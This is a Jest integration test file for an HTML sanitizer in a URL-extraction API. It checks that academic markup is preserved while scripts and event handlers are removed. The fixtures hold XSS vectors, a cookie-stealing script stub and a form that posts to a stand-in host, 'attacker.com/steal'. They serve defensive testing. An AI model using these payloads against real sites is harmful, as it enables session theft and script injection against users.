/**
 * @jest-environment node
 */
/**
 * URL Extract API Sanitization Integration Tests
 * 
 * Comprehensive tests for storage-time HTML sanitization in the URL extraction API.
 * Tests the full flow from URL extraction through AI processing, sanitization, 
 * and database storage with real database integration.
 */

import { POST } from '../extract-url/route'
import { createClient } from '@/lib/supabase/server'
import { DocumentService } from '@/lib/services/database/documents'
import type { SupabaseClient } from '@supabase/supabase-js'
import type { Database } from '@/lib/types/database'
import { getTestNamespace, createTestEmail, createTestMetadata } from '@/lib/testing/test-isolation-utils'

// Mock the multimodal prompt execution
jest.mock('@/lib/prompts/types', () => ({
  executeMultimodalPromptWithUsage: jest.fn(),
  loadMultimodalPromptTemplateFromCaller: jest.fn()
}))

// Mock authentication to return a test user
jest.mock('@/lib/auth/server-auth', () => ({
  validateAuth: jest.fn()
}))

// Mock slug generation
jest.mock('@/lib/utils/slug', () => ({
  generateSlug: jest.fn().mockImplementation((text: string) => text.toLowerCase().replace(/\s+/g, '-').slice(0, 50)),
  generateHtmlFilename: jest.fn().mockImplementation((url: string) => {
    const domain = new URL(url).hostname.replace(/\./g, '-')
    return `${domain}-${Date.now()}.html`
  })
}))

// Mock global fetch for URL content fetching
global.fetch = jest.fn()

import { executeMultimodalPromptWithUsage } from '@/lib/prompts/types'
import { validateAuth } from '@/lib/auth/server-auth'

const mockExecutePrompt = executeMultimodalPromptWithUsage as jest.MockedFunction<typeof executeMultimodalPromptWithUsage>
const mockValidateAuth = validateAuth as jest.MockedFunction<typeof validateAuth>
const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>

describe('URL Extract API - Sanitization Integration', () => {
  const namespace = getTestNamespace('extract-url-sanitization')
  let supabase: SupabaseClient<Database>
  let documentService: DocumentService
  let testUserId: string

  beforeAll(async () => {
    // Set up real database connection
    supabase = await createClient()
    documentService = new DocumentService(supabase)
    
    // Create a test user profile
    testUserId = `test-user-${namespace}`
    const testEmail = createTestEmail(namespace, 'extract-test')
    
    await supabase.from('profiles').insert({
      id: testUserId,
      email: testEmail,
      full_name: 'Extract Test User',
      metadata: createTestMetadata(namespace)
    })
  })

  beforeEach(() => {
    jest.clearAllMocks()
    
    // Mock authentication to return our test user
    mockValidateAuth.mockResolvedValue({ id: testUserId, email: createTestEmail(namespace, 'extract-test') })
    
    // Default successful fetch mock
    mockFetch.mockResolvedValue({
      ok: true,
      status: 200,
      statusText: 'OK',
      headers: new Headers({
        'content-type': 'text/html; charset=utf-8'
      }),
      text: async () => '<html><body><p>Original webpage content</p></body></html>'
    } as Response)
    
    // Default successful mock for AI processing
    mockExecutePrompt.mockResolvedValue({
      text: '<html><body><p>Extracted clean content</p></body></html>',
      usage: { totalTokens: 100, promptTokens: 50, completionTokens: 50 },
      finishReason: 'stop'
    })
  })

  afterAll(async () => {
    // Clean up test data
    await supabase.from('documents').delete().eq('user_id', testUserId)
    await supabase.from('ai_calls').delete().contains('input_data', { test_namespace: namespace })
    await supabase.from('profiles').delete().eq('id', testUserId)
  })

  const createRequest = (body: Record<string, unknown>): Request => {
    return new Request('http://localhost:3000/api/extract-url', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body)
    })
  }

  describe('Academic Content Preservation During Sanitization', () => {
    it('should preserve academic content from AI extraction', async () => {
      const academicPageContent = `
        <html>
        <head><title>Research Paper</title></head>
        <body>
          <div class="ads">Advertisement</div>
          <script>trackingCode()</script>
          <main>
            <h1>Quantum Computing Research</h1>
            <p>This paper presents novel findings in quantum computing.</p>
            <math xmlns="http://www.w3.org/1998/Math/MathML">
              <mrow>
                <mi>H</mi>
                <mo>=</mo>
                <mfrac>
                  <mn>1</mn>
                  <msqrt><mn>2</mn></msqrt>
                </mfrac>
                <mrow>
                  <mo>(</mo>
                  <mi>|0⟩</mi>
                  <mo>+</mo>
                  <mi>|1⟩</mi>
                  <mo>)</mo>
                </mrow>
              </mrow>
            </math>
            <figure data-figure-id="quantum-circuit">
              <figcaption>
                <strong>Figure 1:</strong> Quantum circuit diagram
                <cite data-ref="nielsen2000">(Nielsen & Chuang, 2000)</cite>
              </figcaption>
            </figure>
            <table data-table-id="experimental-results">
              <thead>
                <tr>
                  <th colspan="3">Quantum State Measurements</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td data-state="superposition">|ψ⟩</td>
                  <td>0.707</td>
                  <td>±0.012</td>
                </tr>
              </tbody>
            </table>
          </main>
          <footer>Page footer</footer>
        </body>
        </html>
      `

      // Mock extracted academic content from AI
      const extractedAcademicContent = `
        <html>
        <body>
          <article>
            <h1>Quantum Computing Research</h1>
            <p>This paper presents novel findings in quantum computing.</p>
            <math xmlns="http://www.w3.org/1998/Math/MathML">
              <mrow>
                <mi>H</mi>
                <mo>=</mo>
                <mfrac>
                  <mn>1</mn>
                  <msqrt><mn>2</mn></msqrt>
                </mfrac>
                <mrow>
                  <mo>(</mo>
                  <mi>|0⟩</mi>
                  <mo>+</mo>
                  <mi>|1⟩</mi>
                  <mo>)</mo>
                </mrow>
              </mrow>
            </math>
            <figure data-figure-id="quantum-circuit">
              <figcaption>
                <strong>Figure 1:</strong> Quantum circuit diagram
                <cite data-ref="nielsen2000">(Nielsen & Chuang, 2000)</cite>
              </figcaption>
            </figure>
            <table data-table-id="experimental-results">
              <thead>
                <tr>
                  <th colspan="3">Quantum State Measurements</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td data-state="superposition">|ψ⟩</td>
                  <td>0.707</td>
                  <td>±0.012</td>
                </tr>
              </tbody>
            </table>
          </article>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => academicPageContent
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: extractedAcademicContent,
        usage: { totalTokens: 250, promptTokens: 150, completionTokens: 100 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://arxiv.org/abs/1234.5678',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      expect(responseData.success).toBe(true)

      // Verify sanitized content preserves academic elements
      const sanitizedHtml = responseData.document.html_content
      expect(sanitizedHtml).toContain('<math')
      expect(sanitizedHtml).toContain('<mfrac>')
      expect(sanitizedHtml).toContain('<msqrt>')
      expect(sanitizedHtml).toContain('|ψ⟩') // Unicode symbols preserved
      expect(sanitizedHtml).toContain('<figure')
      expect(sanitizedHtml).toContain('data-figure-id="quantum-circuit"')
      expect(sanitizedHtml).toContain('<cite')
      expect(sanitizedHtml).toContain('data-ref="nielsen2000"')
      expect(sanitizedHtml).toContain('colspan="3"')
      expect(sanitizedHtml).toContain('data-state="superposition"')

      // Verify document was stored in database with sanitized content
      const document = await documentService.getDocumentBySlug(responseData.document.slug, testUserId)
      expect(document).toBeTruthy()
      expect(document!.html_content).toContain('<math')
      expect(document!.html_content).toContain('<figure')
      expect(document!.source_url).toBe('https://arxiv.org/abs/1234.5678')
    })

    it('should preserve readability-extracted content with academic formatting', async () => {
      // Mock readability extraction returning academic content
      
      // Create a properly structured academic article
      const readabilityContent = `
        <html>
        <body>
          <article>
            <h1>Statistical Analysis of Experimental Data</h1>
            <p>This study examines the statistical significance of experimental measurements.</p>
            <table data-table-id="anova-results">
              <caption>
                <strong>Table 1:</strong> ANOVA Results for Experimental Groups
              </caption>
              <thead>
                <tr>
                  <th rowspan="2">Factor</th>
                  <th colspan="4">Statistical Measures</th>
                </tr>
                <tr>
                  <th>F-statistic</th>
                  <th>p-value</th>
                  <th>Effect Size</th>
                  <th>Confidence</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td data-factor="treatment">Treatment</td>
                  <td>12.45</td>
                  <td>&lt; 0.001</td>
                  <td>0.72</td>
                  <td>95%</td>
                </tr>
              </tbody>
            </table>
            <p>The results show statistically significant effects (F = 12.45, p &lt; 0.001).</p>
          </article>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => `<html><body>${readabilityContent}</body></html>`
      } as Response)

      // Mock readability to succeed and return academic content
      jest.doMock('@/lib/utils/readability-extractor', () => ({
        extractWithReadability: jest.fn().mockReturnValue({
          title: 'Statistical Analysis of Experimental Data',
          content: readabilityContent.replace(/<\/?html>|<\/?body>/g, ''),
          textContent: 'Statistical analysis text content',
          siteName: 'Academic Journal',
          byline: 'Dr. Jane Smith'
        }),
        formatReadabilityHtml: jest.fn().mockReturnValue(readabilityContent)
      }))

      const request = createRequest({
        url: 'https://journal.org/statistics-paper',
        provider: 'claude',
        extractionMethod: 'readability'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const sanitizedHtml = responseData.document.html_content

      // Verify complex table structure is preserved
      expect(sanitizedHtml).toContain('data-table-id="anova-results"')
      expect(sanitizedHtml).toContain('<caption>')
      expect(sanitizedHtml).toContain('rowspan="2"')
      expect(sanitizedHtml).toContain('colspan="4"')
      expect(sanitizedHtml).toContain('data-factor="treatment"')
      expect(sanitizedHtml).toContain('&lt; 0.001') // HTML entities preserved
    })
  })

  describe('XSS Prevention and Malicious Content Removal', () => {
    it('should remove malicious content from extracted webpage', async () => {
      const maliciousPageContent = `
        <html>
        <head>
          <script>trackUser()</script>
          <title>Malicious Page</title>
        </head>
        <body>
          <h1>Academic Research</h1>
          <p>Legitimate research content.</p>
          <script>
            // Malicious tracking code
            sendDataToAttacker(document.cookie);
          </script>
          <div onclick="alert('XSS')" style="cursor: pointer;">
            <p>Click for more information</p>
          </div>
          <img src="image.jpg" onerror="maliciousFunction()" alt="Research diagram" />
          <iframe src="javascript:alert('embedded XSS')">Fallback content</iframe>
          <form action="https://attacker.com/steal" method="post">
            <input type="hidden" name="data" value="sensitive" />
            <button type="submit">Submit</button>
          </form>
          <p>More legitimate content here.</p>
        </body>
        </html>
      `

      // AI extraction returns cleaned but still dangerous content
      const extractedMaliciousContent = `
        <html>
        <body>
          <article>
            <h1>Academic Research</h1>
            <p>Legitimate research content.</p>
            <script>sendDataToAttacker(document.cookie);</script>
            <div onclick="alert('XSS')">
              <p>Click for more information</p>
            </div>
            <img src="image.jpg" onerror="maliciousFunction()" alt="Research diagram" />
            <iframe src="javascript:alert('embedded XSS')">Fallback content</iframe>
            <p>More legitimate content here.</p>
          </article>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => maliciousPageContent
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: extractedMaliciousContent,
        usage: { totalTokens: 180, promptTokens: 120, completionTokens: 60 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://malicious-site.com/research',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const sanitizedHtml = responseData.document.html_content

      // Verify malicious elements are removed
      expect(sanitizedHtml).not.toContain('<script>')
      expect(sanitizedHtml).not.toContain('sendDataToAttacker')
      expect(sanitizedHtml).not.toContain('onclick')
      expect(sanitizedHtml).not.toContain('onerror')
      expect(sanitizedHtml).not.toContain('<iframe')
      expect(sanitizedHtml).not.toContain('javascript:')
      expect(sanitizedHtml).not.toContain('<form')
      expect(sanitizedHtml).not.toContain('<input')
      expect(sanitizedHtml).not.toContain('<button')

      // Verify legitimate content is preserved
      expect(sanitizedHtml).toContain('Academic Research')
      expect(sanitizedHtml).toContain('Legitimate research content')
      expect(sanitizedHtml).toContain('More legitimate content')
      expect(sanitizedHtml).toContain('alt="Research diagram"') // Safe attributes preserved

      // Verify database storage
      const document = await documentService.getDocumentBySlug(responseData.document.slug, testUserId)
      expect(document!.html_content).not.toContain('<script>')
      expect(document!.html_content).toContain('Legitimate research content')
    })

    it('should handle complex XSS attack vectors in webpage content', async () => {
      const xssVectors = [
        '<script>alert("direct script")</script>',
        '<img src="x" onerror="alert(\'img onerror\')" />',
        '<svg onload="alert(\'svg onload\')"><circle r="5"/></svg>',
        '<div onclick="alert(\'div onclick\')">Content</div>',
        '<a href="javascript:alert(\'javascript href\')">Link</a>',
        '<iframe src="data:text/html,<script>alert(\'iframe data\')</script>"></iframe>',
        '<object data="data:text/html,<script>alert(\'object data\')</script>"></object>',
        '<embed src="javascript:alert(\'embed src\')" />',
        '<form action="javascript:alert(\'form action\')"><button>Submit</button></form>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'meta refresh\')" />'
      ]

      const maliciousContent = `
        <html>
        <body>
          <h1>Research Paper with Embedded Attacks</h1>
          <p>Legitimate academic introduction.</p>
          ${xssVectors.join('\n')}
          <p>Legitimate academic conclusion.</p>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => maliciousContent
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: maliciousContent,
        usage: { totalTokens: 200, promptTokens: 130, completionTokens: 70 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://compromised-academic-site.edu/paper',
        provider: 'gemini',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const sanitizedHtml = responseData.document.html_content

      // Verify all XSS vectors are neutralized
      expect(sanitizedHtml).not.toContain('alert(')
      expect(sanitizedHtml).not.toContain('javascript:')
      expect(sanitizedHtml).not.toContain('<script>')
      expect(sanitizedHtml).not.toContain('<iframe')
      expect(sanitizedHtml).not.toContain('<object')
      expect(sanitizedHtml).not.toContain('<embed')
      expect(sanitizedHtml).not.toContain('<form')
      expect(sanitizedHtml).not.toContain('<meta')
      expect(sanitizedHtml).not.toContain('onerror')
      expect(sanitizedHtml).not.toContain('onclick')
      expect(sanitizedHtml).not.toContain('onload')

      // Verify legitimate content remains
      expect(sanitizedHtml).toContain('Research Paper with Embedded Attacks')
      expect(sanitizedHtml).toContain('Legitimate academic introduction')
      expect(sanitizedHtml).toContain('Legitimate academic conclusion')
    })
  })

  describe('Sanitization Error Handling', () => {
    it('should return 422 error when sanitization fails', async () => {
      // Mock sanitizeAcademicContent to throw an error
      jest.doMock('@/lib/utils/html-sanitizer', () => ({
        sanitizeAcademicContent: jest.fn().mockImplementation(() => {
          throw new Error('Sanitization failed due to corrupted HTML structure')
        })
      }))

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => '<html><body>Content</body></html>'
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: '<html><body>Extracted content</body></html>',
        usage: { totalTokens: 100, promptTokens: 50, completionTokens: 50 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://example.com/corrupted',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(422)

      const errorText = await response.text()
      expect(errorText).toContain('Content could not be safely processed')
    })

    it('should return 413 error when extracted content is too large', async () => {
      // Mock sanitizer to throw size limit error
      jest.doMock('@/lib/utils/html-sanitizer', () => ({
        sanitizeAcademicContent: jest.fn().mockImplementation(() => {
          throw new Error('HTML content too large (55MB). Maximum size is 50MB')
        })
      }))

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => '<html><body>Small original</body></html>'
      } as Response)

      // Mock AI extraction returning very large content
      const largeContent = '<html><body>' + 'A'.repeat(55 * 1024 * 1024) + '</body></html>'
      mockExecutePrompt.mockResolvedValue({
        text: largeContent,
        usage: { totalTokens: 1000, promptTokens: 800, completionTokens: 200 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://example.com/large-extraction',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(413)

      const errorText = await response.text()
      expect(errorText).toContain('too large to process safely')
    })

    it('should handle readability extraction with dangerous content', async () => {
      const maliciousReadabilityContent = `
        <article>
          <h1>Academic Paper</h1>
          <p>Research content</p>
          <script>maliciousCode()</script>
          <div onclick="attack()">Interactive element</div>
        </article>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => `<html><body>${maliciousReadabilityContent}</body></html>`
      } as Response)

      // Mock readability to return content with scripts
      jest.doMock('@/lib/utils/readability-extractor', () => ({
        extractWithReadability: jest.fn().mockReturnValue({
          title: 'Academic Paper',
          content: maliciousReadabilityContent,
          textContent: 'Academic Paper Research content',
          siteName: 'Academic Site',
          byline: 'Author Name'
        }),
        formatReadabilityHtml: jest.fn().mockReturnValue(`<html><body>${maliciousReadabilityContent}</body></html>`)
      }))

      const request = createRequest({
        url: 'https://academic-site.edu/paper-with-scripts',
        provider: 'claude',
        extractionMethod: 'readability'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const sanitizedHtml = responseData.document.html_content

      // Verify malicious content is removed even from readability extraction
      expect(sanitizedHtml).not.toContain('<script>')
      expect(sanitizedHtml).not.toContain('maliciousCode')
      expect(sanitizedHtml).not.toContain('onclick')
      expect(sanitizedHtml).not.toContain('attack()')

      // Verify legitimate content is preserved
      expect(sanitizedHtml).toContain('Academic Paper')
      expect(sanitizedHtml).toContain('Research content')
    })
  })

  describe('Database Storage Integration', () => {
    it('should store sanitized HTML from AI extraction in html_content field', async () => {
      const originalWebpage = `
        <html>
        <body>
          <div class="header">Site Header</div>
          <main>
            <h1>Research Article</h1>
            <p>Academic content</p>
            <script>analytics.track()</script>
          </main>
          <div class="sidebar">Ads</div>
        </body>
        </html>
      `

      const extractedContent = `
        <html>
        <body>
          <article>
            <h1>Research Article</h1>
            <p>Academic content</p>
            <script>console.log('extracted but dangerous')</script>
            <math><mi>x</mi><mo>=</mo><mn>1</mn></math>
          </article>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => originalWebpage
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: extractedContent,
        usage: { totalTokens: 150, promptTokens: 100, completionTokens: 50 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://research-journal.org/article-123',
        title: 'Custom Research Title',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const documentId = responseData.document.id

      // Verify document in database
      const { data: dbDocument } = await supabase
        .from('documents')
        .select('*')
        .eq('id', documentId)
        .single()

      expect(dbDocument).toBeTruthy()
      expect(dbDocument.html_content).toBeTruthy()
      expect(dbDocument.source_url).toBe('https://research-journal.org/article-123')
      
      // Verify sanitization occurred (script removed, math preserved)
      expect(dbDocument.html_content).not.toContain('<script>')
      expect(dbDocument.html_content).toContain('<math>')
      expect(dbDocument.html_content).toContain('Academic content')

      // Verify metadata includes extraction info
      expect(dbDocument.upload_metadata).toMatchObject({
        extraction_method: 'ai-transcription',
        upload_source: 'url',
        provider_used: 'claude'
      })
    })

    it('should store sanitized HTML from readability extraction', async () => {
      const readabilityContent = `
        <article>
          <h1>Statistical Methods Paper</h1>
          <p>This paper examines statistical methods.</p>
          <table data-table-id="methods">
            <thead>
              <tr><th>Method</th><th>Accuracy</th></tr>
            </thead>
            <tbody>
              <tr>
                <td>Bayesian</td>
                <td>0.95</td>
              </tr>
            </tbody>
          </table>
        </article>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => `<html><body>${readabilityContent}</body></html>`
      } as Response)

      // Mock readability extraction
      jest.doMock('@/lib/utils/readability-extractor', () => ({
        extractWithReadability: jest.fn().mockReturnValue({
          title: 'Statistical Methods Paper',
          content: readabilityContent.replace(/<\/?article>/g, ''),
          textContent: 'Statistical methods paper content',
          siteName: 'Statistics Journal',
          byline: 'Dr. Statistics Expert'
        }),
        formatReadabilityHtml: jest.fn().mockReturnValue(readabilityContent)
      }))

      const request = createRequest({
        url: 'https://stats-journal.com/methods-paper',
        provider: 'claude',
        extractionMethod: 'readability'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const documentId = responseData.document.id

      // Verify document in database
      const { data: dbDocument } = await supabase
        .from('documents')
        .select('*')
        .eq('id', documentId)
        .single()

      expect(dbDocument).toBeTruthy()
      expect(dbDocument.html_content).toContain('<article>')
      expect(dbDocument.html_content).toContain('data-table-id="methods"')
      expect(dbDocument.html_content).toContain('Statistical Methods Paper')

      // Verify readability-specific metadata
      expect(dbDocument.upload_metadata).toMatchObject({
        extraction_method: 'readability',
        upload_source: 'url',
        provider_used: null // No AI provider for readability
      })
    })

    it('should maintain referential integrity with AI calls for AI extraction', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => '<html><body>Original webpage</body></html>'
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: '<html><body><article><p>AI extracted content</p></article></body></html>',
        usage: { totalTokens: 120, promptTokens: 80, completionTokens: 40 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://example.edu/research',
        provider: 'gemini',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const documentId = responseData.document.id

      // Get document with AI call relationship
      const { data: dbDocument } = await supabase
        .from('documents')
        .select('*, ai_calls(*)')
        .eq('id', documentId)
        .single()

      expect(dbDocument).toBeTruthy()
      expect(dbDocument.upload_ai_call_id).toBeTruthy()
      expect(dbDocument.ai_calls).toBeTruthy()
      expect(dbDocument.ai_calls.prompt_type).toBe('url-to-html')
      expect(dbDocument.ai_calls.usage).toMatchObject({
        totalTokens: 120,
        promptTokens: 80,
        completionTokens: 40
      })

      // Verify AI call input data includes URL
      expect(dbDocument.ai_calls.input_data).toMatchObject({
        source_url: 'https://example.edu/research'
      })
    })

    it('should handle readability extraction without creating AI call records', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => '<html><body>Webpage content</body></html>'
      } as Response)

      // Mock readability extraction
      jest.doMock('@/lib/utils/readability-extractor', () => ({
        extractWithReadability: jest.fn().mockReturnValue({
          title: 'Readability Extracted Title',
          content: '<h1>Readability Extracted Title</h1><p>Content extracted by readability</p>',
          textContent: 'Readability content text',
          siteName: 'Test Site',
          byline: 'Test Author'
        }),
        formatReadabilityHtml: jest.fn().mockReturnValue('<article><h1>Readability Extracted Title</h1><p>Content extracted by readability</p></article>')
      }))

      const request = createRequest({
        url: 'https://news-site.com/article',
        provider: 'claude',
        extractionMethod: 'readability'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const documentId = responseData.document.id

      // Get document from database
      const { data: dbDocument } = await supabase
        .from('documents')
        .select('*')
        .eq('id', documentId)
        .single()

      expect(dbDocument).toBeTruthy()
      expect(dbDocument.upload_ai_call_id).toBeNull() // No AI call for readability
      expect(dbDocument.html_content).toContain('Readability Extracted Title')
      expect(dbDocument.upload_metadata.extraction_method).toBe('readability')
    })
  })

  describe('Performance and Edge Cases', () => {
    it('should handle large extracted content within limits', async () => {
      // Create large but valid content (2MB)
      const largeContent = `
        <html>
        <body>
          <article>
            <h1>Large Research Dataset</h1>
            <p>${'Research data point. '.repeat(50000)}</p>
            <table>
              <thead><tr><th>Data</th><th>Value</th></tr></thead>
              <tbody>${'<tr><td>Point</td><td>123.45</td></tr>'.repeat(10000)}</tbody>
            </table>
          </article>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => '<html><body>Original large page</body></html>'
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: largeContent,
        usage: { totalTokens: 800, promptTokens: 600, completionTokens: 200 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://data-repository.edu/large-dataset',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      expect(responseData.success).toBe(true)
      expect(responseData.document.html_content).toContain('Large Research Dataset')
      expect(responseData.document.html_content).toContain('<table>')
    })

    it('should preserve mixed academic and regular content', async () => {
      const mixedContent = `
        <html>
        <body>
          <header>
            <nav>Site navigation</nav>
          </header>
          <main>
            <article>
              <h1>Biochemistry Research</h1>
              <p>This study examines protein structures.</p>
              <figure data-figure-id="protein-3d">
                <img src="protein.svg" alt="3D protein structure" />
                <figcaption>
                  <strong>Figure 2:</strong> 3D protein structure
                  <cite data-ref="smith2024">(Smith et al., 2024)</cite>
                </figcaption>
              </figure>
              <math xmlns="http://www.w3.org/1998/Math/MathML">
                <mrow>
                  <mi>K</mi>
                  <mo>=</mo>
                  <mfrac>
                    <mrow><mo>[</mo><mi>P</mi><mo>]</mo></mrow>
                    <mrow><mo>[</mo><mi>S</mi><mo>]</mo></mrow>
                  </mfrac>
                </mrow>
              </math>
              <p>The dissociation constant K indicates binding affinity.</p>
            </article>
          </main>
          <aside>
            <div class="ads">Advertisements</div>
            <script>trackPageView()</script>
          </aside>
          <footer>Page footer</footer>
        </body>
        </html>
      `

      mockFetch.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        headers: new Headers({
          'content-type': 'text/html; charset=utf-8'
        }),
        text: async () => mixedContent
      } as Response)

      mockExecutePrompt.mockResolvedValue({
        text: mixedContent,
        usage: { totalTokens: 300, promptTokens: 200, completionTokens: 100 },
        finishReason: 'stop'
      })

      const request = createRequest({
        url: 'https://biochem-journal.org/protein-study',
        provider: 'claude',
        extractionMethod: 'ai-transcription'
      })

      const response = await POST(request)
      expect(response.status).toBe(201)

      const responseData = await response.json()
      const sanitizedHtml = responseData.document.html_content

      // Academic content should be preserved
      expect(sanitizedHtml).toContain('Biochemistry Research')
      expect(sanitizedHtml).toContain('<figure')
      expect(sanitizedHtml).toContain('data-figure-id="protein-3d"')
      expect(sanitizedHtml).toContain('<cite')
      expect(sanitizedHtml).toContain('data-ref="smith2024"')
      expect(sanitizedHtml).toContain('<math')
      expect(sanitizedHtml).toContain('<mfrac>')
      expect(sanitizedHtml).toContain('alt="3D protein structure"')

      // Non-academic/dangerous content should be removed
      expect(sanitizedHtml).not.toContain('<script>')
      expect(sanitizedHtml).not.toContain('trackPageView')
    })
  })
})